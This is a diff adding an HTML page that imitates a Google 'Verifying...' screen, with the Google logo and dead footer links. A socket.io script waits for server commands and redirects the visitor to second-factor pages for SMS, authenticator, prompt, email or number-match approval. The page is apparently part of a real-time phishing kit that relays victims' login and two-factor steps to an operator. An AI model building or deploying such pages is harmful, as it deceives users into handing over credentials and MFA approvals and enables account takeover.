@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Verifying...</title>
+    <style>
+        *,
+        *::before,
+        *::after {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0
+        }
+
+        @import url('https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&family=Roboto:wght@400;500&display=swap');
+
+        :root {
+            --bg: #000000;
+            --card-bg: #000000;
+            --card-border: #3c4043;
+            --text-primary: #ffffff;
+            --text-secondary: #9aa0a6;
+            --link-color: #8ab4f8
+        }
+
+        html,
+        body {
+            height: 100%
+        }
+
+        body {
+            font-family: 'Roboto', Arial, sans-serif;
+            background: var(--bg);
+            color: var(--text-primary);
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh
+        }
+
+        .page-wrap {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 24px
+        }
+
+        .card {
+            background: var(--card-bg);
+            border-radius: 8px;
+            border: 1px solid var(--card-border);
+            padding: 64px 40px;
+            width: 450px;
+            max-width: 100%;
+            text-align: center;
+            animation: fadeIn 0.4s ease-out
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0
+            }
+
+            to {
+                opacity: 1
+            }
+        }
+
+        .logo-wrap {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 32px
+        }
+
+        .verifying-text {
+            font-size: 16px;
+            color: var(--text-secondary)
+        }
+
+        .dots::after {
+            content: '';
+            animation: dots 1.5s steps(4, end) infinite
+        }
+
+        @keyframes dots {
+            0% {
+                content: ''
+            }
+
+            25% {
+                content: '.'
+            }
+
+            50% {
+                content: '..'
+            }
+
+            75% {
+                content: '...'
+            }
+        }
+
+        .footer {
+            display: flex;
+            justify-content: space-between;
+            padding: 16px 24px;
+            flex-shrink: 0
+        }
+
+        .footer select {
+            background: transparent;
+            color: var(--text-secondary);
+            border: none;
+            font-size: 13px;
+            outline: none;
+            -webkit-appearance: none;
+            appearance: none;
+            padding-right: 16px;
+            background-image: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='10' height='5' fill='%239aa0a6'%3E%3Cpath d='M0 0l5 5 5-5z'/%3E%3C/svg%3E");
+            background-repeat: no-repeat;
+            background-position: right center
+        }
+
+        .footer-right {
+            display: flex;
+            gap: 28px
+        }
+
+        .footer-right a {
+            color: var(--text-secondary);
+            text-decoration: none;
+            font-size: 13px
+        }
+
+        @media(max-width:600px) {
+            body {
+                background: var(--card-bg)
+            }
+
+            .page-wrap {
+                padding: 0;
+                align-items: center
+            }
+
+            .card {
+                border: none;
+                border-radius: 0;
+                width: 100%;
+                padding: 64px 24px
+            }
+
+            .footer {
+                background: var(--card-bg);
+                padding: 12px 24px
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="page-wrap">
+        <div class="card">
+            <div class="logo-wrap">
+                <img src="/static/google.png" alt="Google" style="width:75px;">
+            </div>
+            <p class="verifying-text">Verifying<span class="dots"></span></p>
+        </div>
+    </div>
+    <div class="footer">
+        <div class="footer-left"><select>
+                <option>English (United States)</option>
+            </select></div>
+        <div class="footer-right"><a href="#">Help</a><a href="#">Privacy</a><a href="#">Terms</a></div>
+    </div>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.4/socket.io.min.js"></script>
+    <script>
+        const socket = io();
+        socket.on('show_step3', function (data) {
+            const variant = data.variant || 'sms';
+            if (data.number) sessionStorage.setItem('matchNumber', data.number);
+            const map = {
+                sms: '/step3/sms',
+                auth: '/step3/auth',
+                prompt: '/step3/prompt',
+                email: '/step3/email',
+                match: '/step3/match?number=' + encodeURIComponent(data.number || '')
+            };
+            document.querySelector('.card').style.opacity = '0';
+            document.querySelector('.card').style.transition = 'opacity 0.3s ease';
+            setTimeout(function () { window.location.href = map[variant] || '/step3/sms'; }, 300);
+        });
+    </script>
+</body>
+
+</html>
